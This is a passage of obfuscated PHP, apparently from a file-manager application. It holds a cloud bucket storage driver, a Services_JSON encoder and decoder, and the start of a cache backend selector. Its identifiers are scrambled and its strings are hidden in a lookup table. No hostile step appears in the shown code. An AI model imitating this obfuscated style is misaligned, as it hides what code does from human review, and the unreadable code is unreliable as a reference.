(strpos($bÚ¥³½ªÛ, $eäŒÁÊˆÙé[213]) === 0) { return array($eäŒÁÊˆÙé[220] => $a…àÔÔË™ä, $eäŒÁÊˆÙé[210] => $B÷Î©¨Úç); } return $a…àÔÔË™ä; goto bø˜§î¿ô—; bø˜§î¿ô—: } public function listUploadParts($F™÷ËÒ®´, $c”›Ëƒ÷é¯ = array()) { goto FÛ…ˆ¬ò‚; FÛ…ˆ¬ò‚: $F°Ì¾‹ÅË =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B†Ä›Îâ‰ô = str_replace($F°Ì¾‹ÅË[221], $F°Ì¾‹ÅË[33], $c”›Ëƒ÷é¯[$F°Ì¾‹ÅË[160]]); $f »¯ß¡î¨ = $this->client->listParts($this->bucket, $F™÷ËÒ®´, $B†Ä›Îâ‰ô); goto eó òÒá; eó òÒá: if (!$f »¯ß¡î¨) { return !1; } unset($c”›Ëƒ÷é¯[$F°Ì¾‹ÅË[211]], $c”›Ëƒ÷é¯[$F°Ì¾‹ÅË[215]]); $c”›Ëƒ÷é¯[$F°Ì¾‹ÅË[89]] = $F™÷ËÒ®´; goto fÙòª¦ÉØ¹; fÙòª¦ÉØ¹: $FîÒâÉ¥¢ = $this->multiUploadAuthData($F™÷ËÒ®´, $c”›Ëƒ÷é¯); if (empty($FîÒâÉ¥¢)) { return !1; } return array($F°Ì¾‹ÅË[220] => $FîÒâÉ¥¢, $F°Ì¾‹ÅË[210] => $c”›Ëƒ÷é¯[$F°Ì¾‹ÅË[210]], $F°Ì¾‹ÅË[222] => $f »¯ß¡î¨); goto eŒ¶ÏƒÇº; eŒ¶ÏƒÇº: } public function getHost() { return parent::getHost() . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][8] . $this->bucket; } public function size($e«Â¶æ±Üë) { $A›¡¬‰«œ = $this->objectMeta($e«Â¶æ±Üë); return $A›¡¬‰«œ ? $A›¡¬‰«œ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]] : 0; } public function info($d‚Â¸ò±Ù) { if ($this->isFolder($d‚Â¸ò±Ù)) { return $this->folderInfo($d‚Â¸ò±Ù); } else { if ($this->isFile($d‚Â¸ò±Ù)) { return $this->fileInfo($d‚Â¸ò±Ù); } } return !1; } public function exist($C©°ˆĞáÖ–) { return $this->isFile($C©°ˆĞáÖ–) || $this->isFolder($C©°ˆĞáÖ–); } public function isFile($AÇé‚»÷ææ) { return !$this->isFolder($AÇé‚»÷ææ) && $this->objectMeta($AÇé‚»÷ææ); } public function isFolder($C¥¬ãÓ¯Ä) { return $this->cacheMethod($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][223], $C¥¬ãÓ¯Ä); } protected function objectMeta($dë©¡¶¢ÕÇ) { return $this->cacheMethod($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][224], $dë©¡¶¢ÕÇ); } protected function _objectMeta($C¡Âß¤Ÿ‡ä) { $FëÙŒÌ¼ĞŸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C¡Âß¤Ÿ‡ä = rtrim($C¡Âß¤Ÿ‡ä, $FëÙŒÌ¼ĞŸ[8]); try { $A¦†‰åóÕÙ = $this->client->getObjectInfo($this->bucket, $C¡Âß¤Ÿ‡ä); if (!isset($A¦†‰åóÕÙ[$FëÙŒÌ¼ĞŸ[207]]) && isset($A¦†‰åóÕÙ[$FëÙŒÌ¼ĞŸ[225]])) { $A¦†‰åóÕÙ[$FëÙŒÌ¼ĞŸ[207]] = $A¦†‰åóÕÙ[$FëÙŒÌ¼ĞŸ[225]]; } } catch (Exception $e ®È„ù¾) { $A¦†‰åóÕÙ = !1; } if (!$A¦†‰åóÕÙ) { } return $A¦†‰åóÕÙ; } protected function _isFolder($aÅİåçª‰) { goto f¿Š‰ÂÅã; EŞÊª—ÃŞ: $Fùã¡ÚÄöÀ = $this->client->getBucket($this->bucket, $aÅİåçª‰, null, 1); if (empty($Fùã¡ÚÄöÀ)) { return !1; } $Fùã¡ÚÄöÀ = array_values($Fùã¡ÚÄöÀ); goto EƒæõÉÕÆ; f¿Š‰ÂÅã: $FåÔ¬Ã²ïÆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÅİåçª‰ = rtrim($aÅİåçª‰, $FåÔ¬Ã²ïÆ[8]); if ($aÅİåçª‰ == $FåÔ¬Ã²ïÆ[33] || $aÅİåçª‰ == $FåÔ¬Ã²ïÆ[8]) { return !0; } goto EŞÊª—ÃŞ; EƒæõÉÕÆ: if (substr($Fùã¡ÚÄöÀ[0][$FåÔ¬Ã²ïÆ[28]], -1) == $FåÔ¬Ã²ïÆ[8]) { return !0; } if (get_path_this($Fùã¡ÚÄöÀ[0][$FåÔ¬Ã²ïÆ[28]]) == get_path_this($aÅİåçª‰)) { return !1; } return !0; goto cğé¶Ñƒ; cğé¶Ñƒ: } } define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][226], 1); goto a†á–éÙ˜; Béå±Ã—: define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1941], 32); class Services_JSON { function __construct($eß‚Ïƒ„Ë = 0) { $this->use = $eß‚Ïƒ„Ë; } function utf162utf8($Côï ë‘©) { $A†Õ¾½çÈç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (function_exists($A†Õ¾½çÈç[68])) { return mb_convert_encoding($Côï ë‘©, $A†Õ¾½çÈç[1590], $A†Õ¾½çÈç[1942]); } $DÉÍµØ¢¤ = ord($Côï ë‘©[0]) << 8 | ord($Côï ë‘©[1]); switch (!0) { case (127 & $DÉÍµØ¢¤) == $DÉÍµØ¢¤: return chr(127 & $DÉÍµØ¢¤); case (2047 & $DÉÍµØ¢¤) == $DÉÍµØ¢¤: return chr(192 | $DÉÍµØ¢¤ >> 6 & 31) . chr(128 | $DÉÍµØ¢¤ & 63); case (65535 & $DÉÍµØ¢¤) == $DÉÍµØ¢¤: return chr(224 | $DÉÍµØ¢¤ >> 12 & 15) . chr(128 | $DÉÍµØ¢¤ >> 6 & 63) . chr(128 | $DÉÍµØ¢¤ & 63); } return $A†Õ¾½çÈç[33]; } function utf82utf16($e”„ßÆàƒ›) { $b–Ÿ‚¹©“± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (function_exists($b–Ÿ‚¹©“±[68])) { return mb_convert_encoding($e”„ßÆàƒ›, $b–Ÿ‚¹©“±[1942], $b–Ÿ‚¹©“±[1590]); } switch (strlen($e”„ßÆàƒ›)) { case 1: return $e”„ßÆàƒ›; case 2: return chr(7 & ord($e”„ßÆàƒ›[0]) >> 2) . chr(192 & ord($e”„ßÆàƒ›[0]) << 6 | 63 & ord($e”„ßÆàƒ›[1])); case 3: return chr(240 & ord($e”„ßÆàƒ›[0]) << 4 | 15 & ord($e”„ßÆàƒ›[1]) >> 2) . chr(192 & ord($e”„ßÆàƒ›[1]) << 6 | 127 & ord($e”„ßÆàƒ›[2])); } return $b–Ÿ‚¹©“±[33]; } function encode($aˆÄëâËä™) { $DÆÕÇ÷ˆ¬÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; switch (gettype($aˆÄëâËä™)) { case $DÆÕÇ÷ˆ¬÷[1601]: return $aˆÄëâËä™ ? $DÆÕÇ÷ˆ¬÷[1600] : $DÆÕÇ÷ˆ¬÷[1602]; case $DÆÕÇ÷ˆ¬÷[1943]: return $DÆÕÇ÷ˆ¬÷[99]; case $DÆÕÇ÷ˆ¬÷[303]: return (int) $aˆÄëâËä™; case $DÆÕÇ÷ˆ¬÷[278]: case $DÆÕÇ÷ˆ¬÷[277]: return (double) $aˆÄëâËä™; case $DÆÕÇ÷ˆ¬÷[312]: $b¬…ÌŒî‚À = $DÆÕÇ÷ˆ¬÷[33]; $bœô‚œÈ  = strlen($aˆÄëâËä™); for ($dœÖí¤Ë…Ø = 0; $dœÖí¤Ë…Ø < $bœô‚œÈ ; ++$dœÖí¤Ë…Ø) { $dˆÁÙÃ®·î = ord($aˆÄëâËä™[$dœÖí¤Ë…Ø]); switch (!0) { case $dˆÁÙÃ®·î == 8: $b¬…ÌŒî‚À .= $DÆÕÇ÷ˆ¬÷[1944]; break; case $dˆÁÙÃ®·î == 9: $b¬…ÌŒî‚À .= $DÆÕÇ÷ˆ¬÷[1577]; break; case $dˆÁÙÃ®·î == 10: $b¬…ÌŒî‚À .= $DÆÕÇ÷ˆ¬÷[1575]; break; case $dˆÁÙÃ®·î == 12: $b¬…ÌŒî‚À .= $DÆÕÇ÷ˆ¬÷[1945]; break; case $dˆÁÙÃ®·î == 13: $b¬…ÌŒî‚À .= $DÆÕÇ÷ˆ¬÷[1576]; break; case $dˆÁÙÃ®·î == 34: case $dˆÁÙÃ®·î == 47: case $dˆÁÙÃ®·î == 92: $b¬…ÌŒî‚À .= $DÆÕÇ÷ˆ¬÷[93] . $aˆÄëâËä™[$dœÖí¤Ë…Ø]; break; case $dˆÁÙÃ®·î >= 32 && $dˆÁÙÃ®·î <= 127: $b¬…ÌŒî‚À .= $aˆÄëâËä™[$dœÖí¤Ë…Ø]; break; case ($dˆÁÙÃ®·î & 224) == 192: $E£‰õñ°‰í = pack($DÆÕÇ÷ˆ¬÷[1946], $dˆÁÙÃ®·î, ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 1])); $dœÖí¤Ë…Ø += 1; $EÕ—’¦ƒ÷ô = $this->utf82utf16($E£‰õñ°‰í); $b¬…ÌŒî‚À .= sprintf($DÆÕÇ÷ˆ¬÷[1947], bin2hex($EÕ—’¦ƒ÷ô)); break; case ($dˆÁÙÃ®·î & 240) == 224: $E£‰õñ°‰í = pack($DÆÕÇ÷ˆ¬÷[1946], $dˆÁÙÃ®·î, ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 1]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 2])); $dœÖí¤Ë…Ø += 2; $EÕ—’¦ƒ÷ô = $this->utf82utf16($E£‰õñ°‰í); $b¬…ÌŒî‚À .= sprintf($DÆÕÇ÷ˆ¬÷[1947], bin2hex($EÕ—’¦ƒ÷ô)); break; case ($dˆÁÙÃ®·î & 248) == 240: $E£‰õñ°‰í = pack($DÆÕÇ÷ˆ¬÷[1946], $dˆÁÙÃ®·î, ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 1]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 2]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 3])); $dœÖí¤Ë…Ø += 3; $EÕ—’¦ƒ÷ô = $this->utf82utf16($E£‰õñ°‰í); $b¬…ÌŒî‚À .= sprintf($DÆÕÇ÷ˆ¬÷[1947], bin2hex($EÕ—’¦ƒ÷ô)); break; case ($dˆÁÙÃ®·î & 252) == 248: $E£‰õñ°‰í = pack($DÆÕÇ÷ˆ¬÷[1946], $dˆÁÙÃ®·î, ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 1]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 2]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 3]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 4])); $dœÖí¤Ë…Ø += 4; $EÕ—’¦ƒ÷ô = $this->utf82utf16($E£‰õñ°‰í); $b¬…ÌŒî‚À .= sprintf($DÆÕÇ÷ˆ¬÷[1947], bin2hex($EÕ—’¦ƒ÷ô)); break; case ($dˆÁÙÃ®·î & 254) == 252: $E£‰õñ°‰í = pack($DÆÕÇ÷ˆ¬÷[1946], $dˆÁÙÃ®·î, ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 1]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 2]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 3]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 4]), ord($aˆÄëâËä™[$dœÖí¤Ë…Ø + 5])); $dœÖí¤Ë…Ø += 5; $EÕ—’¦ƒ÷ô = $this->utf82utf16($E£‰õñ°‰í); $b¬…ÌŒî‚À .= sprintf($DÆÕÇ÷ˆ¬÷[1947], bin2hex($EÕ—’¦ƒ÷ô)); break; } } return $DÆÕÇ÷ˆ¬÷[113] . $b¬…ÌŒî‚À . $DÆÕÇ÷ˆ¬÷[113]; case $DÆÕÇ÷ˆ¬÷[1948]: if (is_array($aˆÄëâËä™) && count($aˆÄëâËä™) && array_keys($aˆÄëâËä™) !== range(0, sizeof($aˆÄëâËä™) - 1)) { $bÍîœÊíÕ = array_map(array($this, $DÆÕÇ÷ˆ¬÷[1949]), array_keys($aˆÄëâËä™), array_values($aˆÄëâËä™)); foreach ($bÍîœÊíÕ as $b‡ ·ÈŞ) { if (Services_JSON::isError($b‡ ·ÈŞ)) { return $b‡ ·ÈŞ; } } return $DÆÕÇ÷ˆ¬÷[1065] . join($DÆÕÇ÷ˆ¬÷[47], $bÍîœÊíÕ) . $DÆÕÇ÷ˆ¬÷[315]; } $e•İ×é’°Õ = array_map(array($this, $DÆÕÇ÷ˆ¬÷[1950]), $aˆÄëâËä™); foreach ($e•İ×é’°Õ as $b›ƒŸÍñÓ) { if (Services_JSON::isError($b›ƒŸÍñÓ)) { return $b›ƒŸÍñÓ; } } return $DÆÕÇ÷ˆ¬÷[157] . join($DÆÕÇ÷ˆ¬÷[47], $e•İ×é’°Õ) . $DÆÕÇ÷ˆ¬÷[478]; case $DÆÕÇ÷ˆ¬÷[1951]: $Dœ¹ÑŒŸÏÖ = get_object_vars($aˆÄëâËä™); $bÍîœÊíÕ = array_map(array($this, $DÆÕÇ÷ˆ¬÷[1949]), array_keys($Dœ¹ÑŒŸÏÖ), array_values($Dœ¹ÑŒŸÏÖ)); foreach ($bÍîœÊíÕ as $b‡ ·ÈŞ) { if (Services_JSON::isError($b‡ ·ÈŞ)) { return $b‡ ·ÈŞ; } } return $DÆÕÇ÷ˆ¬÷[1065] . join($DÆÕÇ÷ˆ¬÷[47], $bÍîœÊíÕ) . $DÆÕÇ÷ˆ¬÷[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $DÆÕÇ÷ˆ¬÷[99] : new Services_JSON_Error(gettype($aˆÄëâËä™) . $DÆÕÇ÷ˆ¬÷[1952]); } } function name_value($cÊƒ÷ÙÊ, $F¡ÔÒ±ÏÚÚ) { $fŠåÜïğÉ = $this->encode($F¡ÔÒ±ÏÚÚ); if (Services_JSON::isError($fŠåÜïğÉ)) { return $fŠåÜïğÉ; } return $this->encode(strval($cÊƒ÷ÙÊ)) . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][4] . $fŠåÜïğÉ; } function reduce_string($F°öº™‚Í) { $B²É·Ñ¸ƒ® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F°öº™‚Í = preg_replace(array($B²É·Ñ¸ƒ®[1953], $B²É·Ñ¸ƒ®[1954], $B²É·Ñ¸ƒ®[1955]), $B²É·Ñ¸ƒ®[33], $F°öº™‚Í); return trim($F°öº™‚Í); } function decode($cäøôôïò÷) { $Fƒ¥ÓŠæñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cäøôôïò÷ = $this->reduce_string($cäøôôïò÷); switch (strtolower($cäøôôïò÷)) { case $Fƒ¥ÓŠæñ[1600]: return !0; case $Fƒ¥ÓŠæñ[1602]: return !1; case $Fƒ¥ÓŠæñ[99]: return null; default: $eºùÛº‰™³ = array(); if (is_numeric($cäøôôïò÷)) { return (double) $cäøôôïò÷ == (int) $cäøôôïò÷ ? (int) $cäøôôïò÷ : (double) $cäøôôïò÷; } elseif (preg_match($Fƒ¥ÓŠæñ[1956], $cäøôôïò÷, $eºùÛº‰™³) && $eºùÛº‰™³[1] == $eºùÛº‰™³[2]) { $FÊÂˆ½‘¯• = substr($cäøôôïò÷, 0, 1); $f¡ î÷§¹ = substr($cäøôôïò÷, 1, -1); $e¹·Â«‚“ = $Fƒ¥ÓŠæñ[33]; $FÜÂŒµÔ¸ = strlen($f¡ î÷§¹); for ($d¯ ×ˆ„Ñº = 0; $d¯ ×ˆ„Ñº < $FÜÂŒµÔ¸; ++$d¯ ×ˆ„Ñº) { $cµ‚íª¨µÈ = substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº, 2); $D’‰ŒË»ê = ord($f¡ î÷§¹[$d¯ ×ˆ„Ñº]); switch (!0) { case $cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1944]: $e¹·Â«‚“ .= chr(8); ++$d¯ ×ˆ„Ñº; break; case $cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1577]: $e¹·Â«‚“ .= chr(9); ++$d¯ ×ˆ„Ñº; break; case $cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1575]: $e¹·Â«‚“ .= chr(10); ++$d¯ ×ˆ„Ñº; break; case $cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1945]: $e¹·Â«‚“ .= chr(12); ++$d¯ ×ˆ„Ñº; break; case $cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1576]: $e¹·Â«‚“ .= chr(13); ++$d¯ ×ˆ„Ñº; break; case $cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1357]: case $cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1957]: case $cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1570]: case $cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1572]: if ($FÊÂˆ½‘¯• == $Fƒ¥ÓŠæñ[113] && $cµ‚íª¨µÈ != $Fƒ¥ÓŠæñ[1957] || $FÊÂˆ½‘¯• == $Fƒ¥ÓŠæñ[55] && $cµ‚íª¨µÈ != $Fƒ¥ÓŠæñ[1357]) { $e¹·Â«‚“ .= $f¡ î÷§¹[++$d¯ ×ˆ„Ñº]; } break; case preg_match($Fƒ¥ÓŠæñ[1958], substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº, 6)): $cğ†ÇğßÆ‹ = chr(hexdec(substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº + 2, 2))) . chr(hexdec(substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº + 4, 2))); $e¹·Â«‚“ .= $this->utf162utf8($cğ†ÇğßÆ‹); $d¯ ×ˆ„Ñº += 5; break; case $D’‰ŒË»ê >= 32 && $D’‰ŒË»ê <= 127: $e¹·Â«‚“ .= $f¡ î÷§¹[$d¯ ×ˆ„Ñº]; break; case ($D’‰ŒË»ê & 224) == 192: $e¹·Â«‚“ .= substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº, 2); ++$d¯ ×ˆ„Ñº; break; case ($D’‰ŒË»ê & 240) == 224: $e¹·Â«‚“ .= substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº, 3); $d¯ ×ˆ„Ñº += 2; break; case ($D’‰ŒË»ê & 248) == 240: $e¹·Â«‚“ .= substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº, 4); $d¯ ×ˆ„Ñº += 3; break; case ($D’‰ŒË»ê & 252) == 248: $e¹·Â«‚“ .= substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº, 5); $d¯ ×ˆ„Ñº += 4; break; case ($D’‰ŒË»ê & 254) == 252: $e¹·Â«‚“ .= substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº, 6); $d¯ ×ˆ„Ñº += 5; break; } } return $e¹·Â«‚“; } elseif (preg_match($Fƒ¥ÓŠæñ[1959], $cäøôôïò÷) || preg_match($Fƒ¥ÓŠæñ[1960], $cäøôôïò÷)) { goto d¼¾¶†ä—„; d¼¾¶†ä—„: if ($cäøôôïò÷[0] == $Fƒ¥ÓŠæñ[157]) { $DŠ‹ŠÆÆ•Ä = array(SERVICES_JSON_IN_ARR); $f®Ë—œñ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $DŠ‹ŠÆÆ•Ä = array(SERVICES_JSON_IN_OBJ); $d¥ïèİ™Êó = array(); } else { $DŠ‹ŠÆÆ•Ä = array(SERVICES_JSON_IN_OBJ); $d¥ïèİ™Êó = new stdClass(); } } array_push($DŠ‹ŠÆÆ•Ä, array($Fƒ¥ÓŠæñ[1961] => SERVICES_JSON_SLICE, $Fƒ¥ÓŠæñ[263] => 0, $Fƒ¥ÓŠæñ[1962] => !1)); $f¡ î÷§¹ = substr($cäøôôïò÷, 1, -1); goto D¥êÍÉ—Ü; D¥êÍÉ—Ü: $f¡ î÷§¹ = $this->reduce_string($f¡ î÷§¹); if ($f¡ î÷§¹ == $Fƒ¥ÓŠæñ[33]) { if (reset($DŠ‹ŠÆÆ•Ä) == SERVICES_JSON_IN_ARR) { return $f®Ë—œñ; } else { return $d¥ïèİ™Êó; } } $FÜÂŒµÔ¸ = strlen($f¡ î÷§¹); goto Dáç—ƒ›±Ï; Dáç—ƒ›±Ï: for ($d¯ ×ˆ„Ñº = 0; $d¯ ×ˆ„Ñº <= $FÜÂŒµÔ¸; ++$d¯ ×ˆ„Ñº) { $Fïµ·˜ŞÊó = end($DŠ‹ŠÆÆ•Ä); $cµ‚íª¨µÈ = substr($f¡ î÷§¹, $d¯ ×ˆ„Ñº, 2); if ($d¯ ×ˆ„Ñº == $FÜÂŒµÔ¸ || $f¡ î÷§¹[$d¯ ×ˆ„Ñº] == $Fƒ¥ÓŠæñ[47] && $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1961]] == SERVICES_JSON_SLICE) { $b¸Õ¯“â ¿ = substr($f¡ î÷§¹, $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[263]], $d¯ ×ˆ„Ñº - $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[263]]); array_push($DŠ‹ŠÆÆ•Ä, array($Fƒ¥ÓŠæñ[1961] => SERVICES_JSON_SLICE, $Fƒ¥ÓŠæñ[263] => $d¯ ×ˆ„Ñº + 1, $Fƒ¥ÓŠæñ[1962] => !1)); if (reset($DŠ‹ŠÆÆ•Ä) == SERVICES_JSON_IN_ARR) { array_push($f®Ë—œñ, $this->decode($b¸Õ¯“â ¿)); } elseif (reset($DŠ‹ŠÆÆ•Ä) == SERVICES_JSON_IN_OBJ) { $BË‰çå×Š = array(); if (preg_match($Fƒ¥ÓŠæñ[1963], $b¸Õ¯“â ¿, $BË‰çå×Š)) { $båÊõË = $this->decode($BË‰çå×Š[1]); $D‰¾ÑœÍŸ = $this->decode($BË‰çå×Š[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $d¥ïèİ™Êó[$båÊõË] = $D‰¾ÑœÍŸ; } else { $d¥ïèİ™Êó->{$båÊõË} = $D‰¾ÑœÍŸ; } } elseif (preg_match($Fƒ¥ÓŠæñ[1964], $b¸Õ¯“â ¿, $BË‰çå×Š)) { $båÊõË = $BË‰çå×Š[1]; $D‰¾ÑœÍŸ = $this->decode($BË‰çå×Š[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $d¥ïèİ™Êó[$båÊõË] = $D‰¾ÑœÍŸ; } else { $d¥ïèİ™Êó->{$båÊõË} = $D‰¾ÑœÍŸ; } } } } elseif (($f¡ î÷§¹[$d¯ ×ˆ„Ñº] == $Fƒ¥ÓŠæñ[113] || $f¡ î÷§¹[$d¯ ×ˆ„Ñº] == $Fƒ¥ÓŠæñ[55]) && $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1961]] != SERVICES_JSON_IN_STR) { array_push($DŠ‹ŠÆÆ•Ä, array($Fƒ¥ÓŠæñ[1961] => SERVICES_JSON_IN_STR, $Fƒ¥ÓŠæñ[263] => $d¯ ×ˆ„Ñº, $Fƒ¥ÓŠæñ[1962] => $f¡ î÷§¹[$d¯ ×ˆ„Ñº])); } elseif ($f¡ î÷§¹[$d¯ ×ˆ„Ñº] == $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1962]] && $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1961]] == SERVICES_JSON_IN_STR && (strlen(substr($f¡ î÷§¹, 0, $d¯ ×ˆ„Ñº)) - strlen(rtrim(substr($f¡ î÷§¹, 0, $d¯ ×ˆ„Ñº), $Fƒ¥ÓŠæñ[93]))) % 2 != 1) { array_pop($DŠ‹ŠÆÆ•Ä); } elseif ($f¡ î÷§¹[$d¯ ×ˆ„Ñº] == $Fƒ¥ÓŠæñ[157] && in_array($Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($DŠ‹ŠÆÆ•Ä, array($Fƒ¥ÓŠæñ[1961] => SERVICES_JSON_IN_ARR, $Fƒ¥ÓŠæñ[263] => $d¯ ×ˆ„Ñº, $Fƒ¥ÓŠæñ[1962] => !1)); } elseif ($f¡ î÷§¹[$d¯ ×ˆ„Ñº] == $Fƒ¥ÓŠæñ[478] && $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1961]] == SERVICES_JSON_IN_ARR) { array_pop($DŠ‹ŠÆÆ•Ä); } elseif ($f¡ î÷§¹[$d¯ ×ˆ„Ñº] == $Fƒ¥ÓŠæñ[1065] && in_array($Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($DŠ‹ŠÆÆ•Ä, array($Fƒ¥ÓŠæñ[1961] => SERVICES_JSON_IN_OBJ, $Fƒ¥ÓŠæñ[263] => $d¯ ×ˆ„Ñº, $Fƒ¥ÓŠæñ[1962] => !1)); } elseif ($f¡ î÷§¹[$d¯ ×ˆ„Ñº] == $Fƒ¥ÓŠæñ[315] && $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1961]] == SERVICES_JSON_IN_OBJ) { array_pop($DŠ‹ŠÆÆ•Ä); } elseif ($cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1965] && in_array($Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1961]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($DŠ‹ŠÆÆ•Ä, array($Fƒ¥ÓŠæñ[1961] => SERVICES_JSON_IN_CMT, $Fƒ¥ÓŠæñ[263] => $d¯ ×ˆ„Ñº, $Fƒ¥ÓŠæñ[1962] => !1)); $d¯ ×ˆ„Ñº++; } elseif ($cµ‚íª¨µÈ == $Fƒ¥ÓŠæñ[1966] && $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[1961]] == SERVICES_JSON_IN_CMT) { array_pop($DŠ‹ŠÆÆ•Ä); $d¯ ×ˆ„Ñº++; for ($fŒ¢±Ÿ·ôò = $Fïµ·˜ŞÊó[$Fƒ¥ÓŠæñ[263]]; $fŒ¢±Ÿ·ôò <= $d¯ ×ˆ„Ñº; ++$fŒ¢±Ÿ·ôò) { $f¡ î÷§¹ = substr_replace($f¡ î÷§¹, $Fƒ¥ÓŠæñ[50], $fŒ¢±Ÿ·ôò, 1); } } } if (reset($DŠ‹ŠÆÆ•Ä) == SERVICES_JSON_IN_ARR) { return $f®Ë—œñ; } elseif (reset($DŠ‹ŠÆÆ•Ä) == SERVICES_JSON_IN_OBJ) { return $d¥ïèİ™Êó; } goto d­Û¼Õ”íí; d­Û¼Õ”íí: } } } function isError($BòÀ©Ë„çÉ, $C¿…ñÊŠ‘® = null) { $Dô¯’È‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (class_exists($Dô¯’È‘[1967])) { return PEAR::isError($BòÀ©Ë„çÉ, $C¿…ñÊŠ‘®); } elseif (is_object($BòÀ©Ë„çÉ) && (get_class($BòÀ©Ë„çÉ) == $Dô¯’È‘[1968] || is_subclass_of($BòÀ©Ë„çÉ, $Dô¯’È‘[1968]))) { return !0; } return !1; } } if (class_exists($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1969])) { class Services_JSON_Error extends PEAR_Error { function __construct($f¥Š´·ºóŸ = "\x75\156\x6b\x6e\157\167\x6e\x20\145\162\x72\157\x72", $EÚÅÑÈ…ˆ = null, $FèêŸ“ïÚœ = null, $F¥ÔŒ¹ä²½ = null, $AÈßÏ‚†—Ö = null) { parent::PEAR_Error($f¥Š´·ºóŸ, $EÚÅÑÈ…ˆ, $FèêŸ“ïÚœ, $F¥ÔŒ¹ä²½, $AÈßÏ‚†—Ö); } } } else { class Services_JSON_Error { function __construct($aĞî£î–¶÷ = "\165\156\x6b\156\x6f\167\156\x20\145\162\x72\x6f\x72", $DùöÈóšÇÄ = null, $BœÓ¼×¹ñŞ = null, $C¤ŠÅ×ßÚ = null, $FÕ¸„øœ’õ = null) { } } } goto E†‰£Ìî­¼; F“­ÉÒã‰¹: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto CñÇÉ‹¹Œô; CñÇÉ‹¹Œô: $dÛÕ™ÇõÆ‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto a‘ã£òíó; eÓ¶¨™Š´: switch ($dÖ·”ªÊ®„[$dÛÕ™ÇõÆ‹[756]]) { case $dÛÕ™ÇõÆ‹[17]: self::$handle = Model($dÛÕ™ÇõÆ‹[758]); break; case $dÛÕ™ÇõÆ‹[759]: self::$handle = new CacheRedis($CÎ¬‰ŒÀ, $d‡¶½‰¯); break; case $dÛÕ™ÇõÆ‹[760]: self::$handle = new CacheMemcached($CÎ¬‰ŒÀ, $d‡¶½‰¯); break; case $dÛÕ™ÇõÆ‹[167]: self::$handle = new CacheFile($CÎ¬‰ŒÀ, $d‡¶½‰¯); break; default: break; } return self::$handle; goto D‡Î¼ÚÄ´; a‘ã£òíó: $dÖ·”ªÊ®„ = 